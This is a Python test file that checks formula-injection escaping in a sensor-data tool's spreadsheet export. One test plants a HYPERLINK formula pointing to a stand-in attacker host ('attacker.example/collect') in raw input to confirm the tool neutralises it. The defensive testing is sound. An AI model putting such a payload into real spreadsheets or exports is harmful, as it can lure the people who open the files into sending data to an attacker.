from openpyxl import load_workbook

from scripts import batch_correction
from scripts import loaders
from scripts.spreadsheet_safety import (
    escape_spreadsheet_formula,
    sanitize_dataframe_for_spreadsheet,
)


def test_escape_spreadsheet_formula_prefixes():
    assert escape_spreadsheet_formula('=HYPERLINK("http://example.com")') == (
        '\'=HYPERLINK("http://example.com")'
    )
    assert escape_spreadsheet_formula("+cmd") == "'+cmd"
    assert escape_spreadsheet_formula("-cmd") == "'-cmd"
    assert escape_spreadsheet_formula("@cmd") == "'@cmd"
    assert escape_spreadsheet_formula("safe") == "safe"
    assert escape_spreadsheet_formula(1) == 1


def test_sanitize_dataframe_returns_original_without_object_columns():
    dataframe = batch_correction.pd.DataFrame({"value": [1, 2]})

    assert sanitize_dataframe_for_spreadsheet(dataframe) is dataframe


def test_batch_process_escapes_formula_like_raw_cells(tmp_path):
    batch_correction.load_config_func = loaders.load_config

    data_dir = tmp_path / "data"
    output_dir = tmp_path / "out"
    data_dir.mkdir()
    output_dir.mkdir()

    payload = '=HYPERLINK("http://attacker.example/collect","click")'
    (data_dir / "S26_Y01.txt").write_text(
        "\n".join(
            [
                "0 10 20",
                f"1 11 {payload}",
                "2 12 22",
                "3 13 23",
                "4 14 24",
                "5 15 25",
                "6 16 26",
                "7 17 27",
                "8 18 28",
                "9 19 29",
            ]
        ),
        encoding="utf-8",
    )
    config_path = tmp_path / "config.json"
    config_path.write_text(
        (
            '{"RAW_DATA_DIR":"%s","SENSOR_TO_RIVER":{"26":54.0},'
            '"defaults":{"window_size":5,"threshold":100,'
            '"gap_threshold_factor":100,"gap_method":"linear",'
            '"outlier_method":"median"}}'
        )
        % data_dir,
        encoding="utf-8",
    )

    batch_correction.batch_process(
        "26",
        [54.0],
        (1995, 1995),
        dry_run=False,
        config_path=str(config_path),
        output_dir=str(output_dir),
    )

    workbook = load_workbook(output_dir / "Year_1995 (Y01)_Data.xlsx", data_only=False)
    cell = workbook.active["C2"]
    assert cell.value == "'" + payload
    assert cell.data_type == "s"
